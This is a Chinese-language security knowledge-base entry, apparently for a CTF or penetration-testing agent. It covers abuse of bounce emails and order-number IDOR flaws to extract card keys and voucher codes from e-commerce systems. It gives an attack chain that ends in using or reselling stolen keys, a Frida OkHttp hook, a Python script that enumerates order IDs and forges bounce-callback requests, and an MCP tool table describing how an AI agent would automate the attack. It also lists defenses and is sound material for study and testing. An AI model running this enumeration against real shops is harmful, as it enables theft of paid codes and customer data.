# 退信滥用 + 订单号授权绕过窃取卡密

## 场景

电商/发卡系统在处理订单通知邮件时，退信（NDR/Bounce）逻辑存在信息泄露和授权绕过，攻击者通过构造不存在邮箱触发退信，利用退信内容或退信处理接口，结合订单号 IDOR 批量提取数据库中的卡密/优惠券码。

## 输入信号

- 下单后系统自动发送含卡密/激活码/订单详情的邮件
- 邮件发送到不存在地址时产生退信（Non-Delivery Receipt）
- 退信内容包含原始邮件正文（含卡密）
- 订单详情页/API 仅通过订单号查询，不验证用户身份
- 订单号可预测（自增 ID、短随机串、时间戳序列）
- 退信处理端点（webhook/API）对外暴露且无来源验证

## 漏洞分类

### 类型 1：退信 NDR 内容泄露

```
下单(假邮箱) → 系统发邮件(含卡密) → 不存在 → 退信
                                            │
                                    退信包含原始邮件内容
                                            │
                                    攻击者通过退信渠道拿到卡密
```

**关键条件**：
- 邮件服务器将原始邮件内容回传在退信中
- 系统未过滤退信中的敏感信息
- 退信能被攻击者接收或读取

### 类型 2：退信处理接口 IDOR

```
下单(假邮箱) → 退信回到系统 → 退信处理接口解析订单号
                                    │
                            接口未验证调用者身份
                                    │
                            攻击者直接调接口 → 查任意订单卡密
```

**关键条件**：
- 退信处理是独立的 webhook/API 端点
- 端点未做来源 IP 白名单或签名验证
- 凭订单号即可查询订单完整信息

### 类型 3：订单查询接口无鉴权（CWE-639 / CWE-862）

```
攻击者知道订单号 → GET /orders/{id} → 返回完整订单含卡密
```

**真实 CVE 先例**：

| CVE | 产品 | 漏洞 |
|-----|------|------|
| CVE-2026-25757 | Spree Commerce | 未认证用户凭订单号查看访客订单 PII，`authorize_access` 对 `user_id=nil` 直接返回 true |
| CVE-2026-32270 | Craft Commerce | 匿名支付邮箱验证失败，JSON 错误响应仍序列化返回完整订单对象 |
| CVE-2025-12919 | EverShop | GraphQL `order` 查询无鉴权，UUID 可枚举，泄露姓名/邮箱/地址/支付状态 |
| CVE-2024-33003 | SAP Commerce (CVSS 9.1) | 优惠券/卡密在 URL 参数中泄露，可被日志/Referer 头截获 |

## 攻击链

```
1. 侦察：注册/下单流程抓包，确认订单号格式（自增/时间戳/UUID）
2. 获取订单号：支付回调 URL、邮件链接、页面跳转 Referer、Burp 被动扫描
3. 测试订单查询接口：不带 Cookie/Token 直接 GET /order/detail?id=1001
   → 若返回订单信息 + 卡密 → 直接 IDOR，跳过后续步骤
4. 若需要"支付后才发卡密"：填假邮箱下单但不支付
   → 部分系统下单时已生成卡密入库，只是不展示
   → 退信触发时系统可能把卡密回显
5. 退信利用：
   a. 发送大量邮件到 @nonexist.example.com → 触发退信
   b. 分析退信内容，提取卡密字段
   c. 如果退信是 webhook 回调：模拟 NDR 格式 POST 到系统退信端点
6. 批量枚举：遍历订单号 → 收集卡密 → 使用/转售
```

## Frida/JS Hook 辅助

```javascript
// 场景：分析 APK/Web 应用的订单查询逻辑
// Hook 关键函数确认鉴权缺失

// 1. Hook OkHttp 请求（Android APK）
Java.perform(function() {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Request = Java.use("okhttp3.Request");
    Request.newBuilder.implementation = function() {
        var builder = this.newBuilder.apply(this, arguments);
        console.log("[OkHttp] URL:", builder.build().url().toString());
        console.log("[OkHttp] Headers:", builder.build().headers().toString());
        return builder;
    };
});

// 2. 修改订单号参数测试越权
// Burp Suite Intruder: 对 orderId 参数做枚举
// Payload: 自增 1000-9999
```

## HTTP 探测

```python
# 探测订单详情接口是否存在 IDOR
import requests

def test_order_idor(base_url, order_id_range):
    """测试订单查询接口是否需要鉴权"""
    for oid in order_id_range:
        # 不带 Cookie 请求
        r = requests.get(f"{base_url}/api/order/detail", params={"id": oid})
        if r.status_code == 200 and "卡密" in r.text or "voucher" in r.text.lower():
            print(f"[!] IDOR found: order {oid} leaks card key")
            print(f"    Response: {r.text[:500]}")

        # 测试退信回调接口
        r2 = requests.post(f"{base_url}/api/bounce/callback", json={
            "order_id": oid,
            "bounce_type": "permanent",
            "email": "nonexist@fake.example.com"
        })
        if r2.status_code == 200:
            print(f"[!] Bounce callback accessible: order {oid}")
            print(f"    Response: {r2.text[:500]}")

test_order_idor("https://target.com", range(1000, 1100))
```

## 防御

| 层面 | 措施 |
|------|------|
| **订单查询** | 必须验证请求者身份（session/token），不能仅凭订单号 |
| **访客订单** | 访客订单也应有随机 token，不能因为 `user_id=NULL` 就跳过鉴权 |
| **退信处理** | 退信回调接口必须验证来源（IP 白名单、HMAC 签名、邮件服务器专用凭证） |
| **退信内容** | 配置邮件服务器仅回传邮件头（headers），不包含原始邮件正文 |
| **卡密生成** | 仅在支付确认后生成并发送卡密，下单时不预生成；或预生成但不通过邮件明文传输 |
| **订单号** | 使用 UUID v4 代替自增 ID 作为外部订单号，增加枚举难度 |
| **频率限制** | 对订单查询接口加 rate limiting，防止批量枚举 |

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动检测上述漏洞：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| HTTP 探测订单接口 | `http_probe` | 无 Cookie 请求订单 API，观察响应是否泄露卡密 |
| 按信号查知识库 | `kb_router` | 搜索 IDOR/bounce/order leak 相关技术文件 |
| 阅读技术细节 | `kb_read_file` | 读取本文档获取完整攻击链 |
| 批量测试 | 编写 Python 脚本 | 循环枚举订单号，检测 IDOR |

## 参考资料

- [CVE-2026-25757] Spree Commerce — Unauthenticated Guest Order Access via IDOR
- [CVE-2026-32270] Craft Commerce — Anonymous Payment Order Data Leak in Error Response
- [CVE-2025-12919] EverShop — GraphQL Order Query Without Authentication
- [CVE-2024-33003] SAP Commerce Cloud — Voucher Codes Exposed in URLs (CVSS 9.1)
- [CWE-639] Authorization Bypass Through User-Controlled Key
- [CWE-200] Exposure of Sensitive Information to an Unauthorized Actor

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
